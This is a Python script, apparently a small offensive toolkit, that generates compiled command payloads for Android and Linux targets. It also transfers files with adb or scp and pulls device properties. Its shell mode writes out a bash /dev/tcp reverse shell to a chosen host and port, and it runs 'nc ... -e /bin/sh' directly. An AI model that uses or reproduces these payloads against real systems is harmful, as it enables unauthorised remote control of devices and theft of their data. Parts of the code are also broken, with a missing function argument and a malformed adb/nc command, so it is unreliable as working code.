#!/usr/bin/env python3
import argparse
import os


#TODO: Figure out a better way to parse input for RemoteUser/RemoteIP for linux enumeration/exploitation


#GLOBALS
BASE_PATH = "/Users/mark/Downloads/android-ndk-r21/toolchains/llvm/prebuilt/darwin-x86_64/bin/" 
FLAGS = '-static-libstdc++ '
ARCH_PATHS = {
    "armv7a": BASE_PATH + 'armv7a-linux-androideabi23-clang++ ' + FLAGS,
    "x86_64": BASE_PATH + 'x86_64-linux-android23-clang++' + FLAGS,
    "aarch64": BASE_PATH + 'aarch64-linux-android23-clang++' + FLAGS,
    "i686": BASE_PATH + 'i686-linux-android23-clang++' + FLAGS,
    "linux": 'g++ -static-libstdc++ '
}


def cli_args():
    parser = argparse.ArgumentParser(description='Payload Generation for a desired architecture.')
    parser.add_argument('-sys', type=str, default='android', help='Linux or Android system (-sys linux // -sys android)', required=True, dest='sys')
    subparsers = parser.add_subparsers(help='Payload Commands', dest="payloadChoice")
    #Parser for pulling files from remote device
    command_parser = subparsers.add_parser('command', help='Generate an executable to run a command')
    command_parser.add_argument('-c', type=str, default=None, help='Command for a command payload', dest='payloadCommand', required=True)
    command_parser.add_argument('-a', type=str, default='armv7a', help='Target Architecture: armv7a, x86_64, aarch64, i686', dest='targetArch')
    command_parser.add_argument('-o', type=str, default='exec', help='Payload output name', dest='payloadName', required=False)
   
    #Parser for Pushing files to remote device
    push_parser = subparsers.add_parser('push', help='Push a file to the remote device')
    push_parser.add_argument('-l', type=str, default=None, help='local filepath', dest='localFile', required=True)
    push_parser.add_argument('-d', type=str, default=None, help='remote destination', dest='remoteFile', required=True)
    push_parser.add_argument('-u', type=str, default=None, help='Remote User for Linux File Transfer', dest='remoteUser', required=False)
    push_parser.add_argument('-r', type=str, default=None, help='Remote IP for Linux File Trasnfer', dest='remoteIP', required=False)



    #Pull Parser frmo remote device
    pull_parser = subparsers.add_parser('pull', help='Pull a file from the remote device')
    pull_parser.add_argument('-d', type=str, default=None, help='Remote Directory (/data/local/tmp/file.txt)', dest='remoteFile', required=True)
    pull_parser.add_argument('-l', type=str, default=None, help='local filepath', dest='localFile', required=True)
    pull_parser.add_argument('-u', type=str, default=None, help='Remote User for Linux File Transfer', dest='remoteUser', required=False)
    pull_parser.add_argument('-r', type=str, default=None, help='Remote IP for Linux File Trasnfer', dest='remoteIP', required=False)

    #Parser for Establishing a reverse shell
    shell_parser = subparsers.add_parser('shell', help='Establish a reverse shell connection with the remote device')
    shell_parser.add_argument('-p', type=int,default=1234, help='Port Number to Listen on', dest='port', required=True)
    shell_parser.add_argument('-l', type=str, default=None, help='Local IP for shell to connect back to', dest='local', required=True)
    shell_parser.add_argument('-r', type=str, default=None, help='Remote IP for shell to connect to', dest='remote', required=True)

    #Info Payload
    info_parser = subparsers.add_parser('info', help='Get information on target')
    info_parser.add_argument('-f', type=str, default=None, help='Optional outfile to write to', required=False)
    info_parser.add_argument('-u', type=str, default=None, help='Remote User for Linux File Transfer', dest='remoteUser', required=False)
    info_parser.add_argument('-r', type=str, default=None, help='Remote IP for Linux File Trasnfer', dest='remoteIP', required=False)

    #Parse
    args = parser.parse_args() 
    return args


def build_payload(command):
    f = open("payload-templates/execute-command.h", "w")
    fullCommand = "std::string command=\"%s\";" % command
    f.write(fullCommand)

def compile_payload(command, targetArch, payloadName):
    call = ARCH_PATHS[targetArch] + ' payload-templates/execute-command.cpp -o %s' % payloadName 
    print("Generating:\n#------------------#\nFile-Name: %s\nArchitecture: %s\nPayload: %s" % (payloadName, targetArch, command))
    os.system(call)


def main():
    cli = cli_args()
    #Command Execution
    if(cli.payloadChoice == "command"):
        if (cli.sys == 'linux'):
            cli.targetArch = 'linux'
        build_payload(cli.payloadCommand)
        compile_payload(cli.payloadCommand, cli.targetArch, cli.payloadName)
    if(cli.payloadChoice == "shell"):
        if (cli.sys == 'linux'):
            cmd = "bash -i >& /dev/tcp/%s/%s 0>&1" % (cli.local, cli.port)
        else:
            cmd = "adb shell sh -i >& toybox nc -l " + str(cli.port)     
        
        os.system('nc %s %s -e /bin/sh' % (cli.remote, cli.port))
        build_payload(cmd)
        compile_payload("", cli.targetArch)
    if(cli.payloadChoice == 'push'):
        if (cli.sys == 'linux'):
            if(cli.remoteUser == None or cli.remoteIP == None):
                print("Linux File transfer requires a Remote User and a Remote IP")
                return
            cmd = "scp -r %s %s@%s:%s" % (cli.localFile, cli.remoteUser, cli.remoteIP, cli.remoteFile)
            print(cmd)
        elif(cli.sys == 'android'):
            cmd = "adb push %s %s" % (cli.localFile, cli.remoteFile)
        else:
            print("You have entered a unsupported environment... currently supported environments are (Linux, Android)")
        os.system(cmd)
    if(cli.payloadChoice == 'pull'):
        if (cli.sys == 'linux'):
            if(cli.remoteUser == None or cli.remoteIP == None):
                print("Linux File transfer requires a Remote User and a Remote IP")
                return
            cmd = "scp -r %s@%s:%s %s" % (cli.remoteUser, cli.remoteIP, cli.remoteFile, cli.localFile)
        elif (cli.sys == 'android'):
            cmd = "adb pull %s" % (cli.remoteFile)
        else:
            print("You have entered a unsupported environment... currently supported environments are (Linux, Android)")
        print(cmd)
        os.system(cmd)
        pass
    if(cli.payloadChoice == 'info'):
        cmd = "adb shell \"getprop > /data/local/tmp/sys.info\""
        os.system(cmd)
        cmd = "adb pull /data/local/tmp/sys.info"
        os.system(cmd)
        print("Pulled system information to \'sys.info\'")
        pass


if __name__ == "__main__":
    main()
